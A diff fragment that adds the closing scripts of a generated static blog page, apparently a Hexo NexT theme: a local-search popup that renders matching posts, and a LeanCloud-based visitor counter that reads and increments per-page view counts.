+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("rAO8AHWqEz3IlgcuNBzFXyK3-gzGzoHsz", "LI2NyeVIf9NiHynChn0UrBCl");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
